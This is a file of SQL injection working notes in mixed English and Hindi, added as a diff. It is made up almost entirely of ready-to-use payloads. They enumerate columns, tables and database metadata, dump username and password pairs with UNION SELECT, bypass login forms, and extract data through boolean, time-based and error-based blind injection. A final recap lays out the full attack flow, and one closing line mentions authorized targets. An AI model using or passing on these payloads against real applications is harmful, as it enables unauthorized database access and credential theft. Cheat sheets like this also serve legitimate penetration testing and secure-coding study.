@@ -1,0 +1,145 @@
+SQL Injection - Recon to Exploitation - Working Notes
+=======================================================
+Format: a' = test injection point (apna actual parameter/value se replace karo)
+
+
+To test :
+==========
+a'
+
+
+Sort & Error Method to Find Total No. of Columns
+==================================================
+
+    To sort the result using 1st Column:
+    =====================================
+    a' order by 1#
+
+    To sort the result using 2nd Column:
+    =====================================
+    a' order by 2#
+
+    To sort the result using 3rd Column:
+    =====================================
+    a' order by 3#
+
+    ... isi tarah increment karte jao (4, 5, 6...) jab tak error na aaye
+
+    We Got Error at:   a' order by 8#   That's Mean Total Columns in Selected Table is 7
+
+
+Check Which Column Data is Reflecting on Page:
+================================================
+a' union select 1,2,3,4,5,6,7#
+
+    Jo number page pe reflect hoga (dikhega), wahi column data extraction ke liye use hoga
+    Maan lo column 2 aur 4 reflect ho rahe hain — inhi ki jagah aage functions daalenge
+
+
+Finding Database Name & Version Using SQL Function:
+=====================================================
+a' union select 1,database(),@@version,4,5,6,7#
+
+
+Finding Current DB User:
+==========================
+a' union select 1,user(),3,4,5,6,7#
+
+
+Finding All Tables Name From Information_Schema.Tables:
+==========================================================
+a' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database()#
+
+    Agar sab tables ek saath chahiye (single row mein):
+    a' union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()#
+
+
+Finding All Column Names From a Specific Table:
+=================================================
+a' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='TABLE_NAME_HERE'#
+
+    Agar sab columns ek saath chahiye (single row mein):
+    a' union select 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='TABLE_NAME_HERE'#
+
+
+Dumping Actual Data (e.g. username, password) From Target Table:
+===================================================================
+a' union select 1,username,password,4,5,6,7 from TABLE_NAME_HERE#
+
+    Multiple rows ek response mein laane ke liye:
+    a' union select 1,group_concat(username,0x3a,password separator 0x0a),3,4,5,6,7 from TABLE_NAME_HERE#
+
+
+Confirming Injection is Real (Boolean Test):
+==============================================
+a' and 1=1#      -> TRUE  (normal page)
+a' and 1=2#      -> FALSE (different/empty page)
+
+    Agar dono response alag hain, injection confirmed hai
+
+
+Basic Auth Bypass (Login Form Testing):
+=========================================
+a' or 1=1#
+a' or '1'='1
+admin'--
+admin' #
+
+
+Blind SQLi - Character by Character Extraction (Boolean-Based):
+==================================================================
+a' and substring(database(),1,1)='a'#
+a' and ascii(substring(database(),1,1))>77#
+
+    Position 1,2,3... badhate jao aur har character guess karo
+
+
+Blind SQLi - Time-Based Confirmation:
+=======================================
+a' and sleep(5)#
+a' and if(substring(database(),1,1)='a',sleep(5),0)#
+
+    Agar response 5 second delay ho jaye, condition TRUE hai
+
+
+Error-Based Extraction (Jab UNION Kaam Na Kare):
+==================================================
+a' and extractvalue(1,concat(0x7e,database()))#
+a' and updatexml(1,concat(0x7e,version()),1)#
+
+
+Finding Number of Rows in a Table:
+====================================
+a' union select 1,count(*),3,4,5,6,7 from TABLE_NAME_HERE#
+
+
+Extracting Nth Row (Jab LIMIT Use Karna Ho):
+==============================================
+a' union select 1,username,password,4,5,6,7 from TABLE_NAME_HERE limit 1 offset 0#
+a' union select 1,username,password,4,5,6,7 from TABLE_NAME_HERE limit 1 offset 1#
+
+
+Comment Style Reference (DB Ke Hisaab Se):
+============================================
+MySQL      : #  ya  -- (space ke saath)
+MSSQL      : --
+Oracle     : --
+PostgreSQL : --
+
+
+Quick Recap - Full Flow Order:
+================================
+1) a'                                          -> injection confirm (error/behavior change)
+2) a' order by N#                              -> column count nikalo
+3) a' union select 1,2,3...N#                  -> reflecting column dhundo
+4) a' union select 1,database(),@@version...#  -> DB info nikalo
+5) a' union select 1,table_name,...#           -> tables list karo
+6) a' union select 1,column_name,...#          -> columns list karo
+7) a' union select 1,username,password,...#    -> actual data dump karo
+
+
+Notes:
+=======
+- Sirf authorized/scope-approved target pe hi test karna
+- Column count aur position har target pe alag ho sakta hai, upar wale N/7 sirf example hai
+- Real target pe apna khud ka column count nikal ke usi hisaab se numbers replace karna
